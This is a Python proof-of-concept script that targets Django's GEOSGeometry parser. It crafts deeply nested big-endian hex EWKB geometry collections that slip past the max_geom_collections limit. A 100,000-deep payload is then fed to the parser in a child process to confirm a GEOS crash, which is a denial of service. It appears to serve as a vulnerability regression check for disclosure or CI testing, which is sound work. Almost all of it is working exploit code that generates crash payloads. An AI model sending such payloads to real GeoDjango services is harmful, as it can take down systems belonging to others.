import struct
import subprocess
import sys

from django.conf import settings

if not settings.configured:
    settings.configure(SECRET_KEY="test", INSTALLED_APPS=[])

import django
django.setup()

from django.contrib.gis.geos import GEOSGeometry
from django.contrib.gis.geos.libgeos import geos_version


def layer(endian, type_code, srid, count=1):
    marker = b"\x01" if endian == "<" else b"\x00"
    return (
        marker
        + struct.pack(f"{endian}I", type_code)
        + struct.pack(f"{endian}I", srid)
        + struct.pack(f"{endian}I", count)
    )


def point(endian, type_code, srid):
    marker = b"\x01" if endian == "<" else b"\x00"
    return (
        marker
        + struct.pack(f"{endian}I", type_code)
        + struct.pack(f"{endian}I", srid)
        + struct.pack(f"{endian}dd", 0.0, 0.0)
    )


def nested_ewkb(endian, depth, srid=0x11111111):
    collection_type = 0x20000007  # EWKB SRID + GeometryCollection.
    point_type = 0x20000001       # EWKB SRID + Point.
    return layer(endian, collection_type, srid) * depth + point(
        endian, point_type, srid
    )


def is_blocked(payload, limit):
    try:
        geom = GEOSGeometry(payload, max_geom_collections=limit)
    except ValueError as exc:
        return True, type(exc).__name__, str(exc)
    except Exception as exc:
        return False, type(exc).__name__, str(exc)
    else:
        return False, geom.geom_type, f"srid={geom.srid}"


def crash_child():
    depth = 100_000
    payload = nested_ewkb(">", depth).hex().upper()
    print(
        f"child: Django={django.get_version()} GEOS={geos_version().decode()} "
        f"depth={depth} hex_bytes={len(payload)}",
        flush=True,
    )
    # Patched Django should reject before entering GEOS. Vulnerable Django's
    # limit_hex() counts zero collections for this big-endian EWKB encoding.
    GEOSGeometry(payload, max_geom_collections=198)
    print("child: unexpectedly returned from GEOSGeometry()", flush=True)


if __name__ == "__main__" and "--crash-child" in sys.argv:
    crash_child()
    raise SystemExit(0)


limit = 5
depth = 6

le = nested_ewkb("<", depth)
be = nested_ewkb(">", depth)

cases = [
    ("little-endian hex str", le.hex().upper()),
    ("big-endian binary memoryview", memoryview(be)),
    ("big-endian hex str", be.hex().upper()),
    ("big-endian hex bytes", be.hex().encode("ascii")),
]

results = {}
print(f"Django={django.get_version()} GEOS={geos_version().decode()}")
for name, payload in cases:
    blocked, kind, detail = is_blocked(payload, limit)
    results[name] = blocked
    print(f"{name}: blocked={blocked} result={kind} detail={detail}")

assert results["little-endian hex str"] is True, "little-endian control was not limited"
assert results["big-endian binary memoryview"] is True, "binary big-endian control was not limited"

if results["big-endian hex str"] or results["big-endian hex bytes"]:
    print("FIXED: big-endian hex EWKB was limited")
    sys.exit(2)

print("VULNERABLE: big-endian hex EWKB bypassed max_geom_collections")

# Run the large payload in a child so a GEOS stack-overflow/segfault doesn't
# terminate the CI harness itself.
proc = subprocess.run(
    [sys.executable, __file__, "--crash-child"],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True,
    timeout=30,
)
print(proc.stdout, end="")
print(f"child_returncode={proc.returncode}")

if proc.returncode == 0:
    raise AssertionError("large payload returned normally; expected rejection or GEOS crash")
if proc.returncode == 2:
    raise AssertionError("unexpected fixed-path return code")

print("DOS_CONFIRMED: malformed request-sized HEXEWKB can reach a fatal GEOS path")
